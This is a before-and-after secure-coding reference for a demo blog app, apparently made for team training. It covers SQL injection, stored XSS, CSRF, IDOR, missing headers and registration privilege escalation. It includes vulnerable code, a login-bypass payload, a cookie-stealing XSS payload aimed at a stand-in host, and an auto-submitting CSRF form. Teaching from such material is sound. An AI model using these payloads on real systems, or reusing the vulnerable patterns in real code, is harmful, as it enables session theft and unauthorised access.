# Vulnerable Code Reference (Before → After)

Kept separate from the audit report so it's easy to use in a training/lunch-and-learn
context. Every snippet below was the actual pre-remediation code for this app; none of it
is hypothetical. **Do not deploy the "before" snippets anywhere** — they're here for
comparison only.

## 1. SQL Injection

**Before**
```js
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const row = db.exec(
    `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
  );
  if (row) res.json({ token: 'ok' });
});
```
Payload: `username = admin' -- ` logs in as admin with any password.

**After** — see `backend/src/models/User.js`: bound parameters (`?`) via `better-sqlite3`
prepared statements. The driver, not string interpolation, decides what's SQL vs. data.

## 2. Stored XSS

**Before**
```jsx
<div dangerouslySetInnerHTML={{ __html: post.body }} />
```
with no sanitization anywhere in the write or read path.
Payload: `<img src=x onerror="fetch('//evil.tld/c?'+document.cookie)">`

**After** — sanitized on write (`backend/src/utils/sanitize.js`) and again on render
(`frontend/src/utils/sanitize.js`), both via DOMPurify with a strict tag allow-list, plus a
CSP that blocks inline script execution as a last line of defense.

## 3. CSRF

**Before:** no token of any kind; a third-party page could do:
```html
<form action="https://secureblog.example/api/posts/42" method="POST">
  <input type="hidden" name="_method" value="DELETE" />
</form>
<script>document.forms[0].submit()</script>
```
and, because the browser attaches cookies automatically, the request succeeded if the
victim was logged in.

**After** — double-submit-cookie CSRF token required via `X-CSRF-Token` header on every
mutating route (`backend/src/middleware/csrfProtection.js`), which a cross-origin page
cannot read or forge, plus `SameSite=Strict` cookies as a second layer.

## 4. Broken Access Control / IDOR

**Before**
```js
app.delete('/api/posts/:id', requireAuth, (req, res) => {
  db.exec(`DELETE FROM posts WHERE id = ${req.params.id}`);
  res.sendStatus(204);
});
```
Any logged-in user could delete any post by guessing/incrementing IDs — no ownership check,
and it's also SQL-injectable through the URL param.

**After** — `requireOwnershipOrAdmin` middleware + parameterized, `author_id`-scoped delete
(`backend/src/middleware/auth.js`, `backend/src/models/Post.js`).

## 5. Missing Security Headers

**Before:** default Express response headers — `X-Powered-By: Express` visible, no CSP, no
HSTS, no frame protection.

**After:** `helmet()` with an explicit policy (`backend/src/config/security.js`) — see the
audit report for the full directive-by-directive rationale.

## 6. Privilege Escalation on Registration

**Before**
```js
const role = req.body.role || 'user';
db.exec(`INSERT INTO users (username, role) VALUES ('${username}', '${role}')`);
```
`POST /register` with `{ "role": "admin" }` created an admin account, no auth required.

**After** — role is never read from the client; every new account is hardcoded `'user'`
server-side (`backend/src/controllers/authController.js`). Role changes are an explicit,
separate admin-only operation (not implemented in this demo scope, but the model supports it
via `requireRole('admin')`).
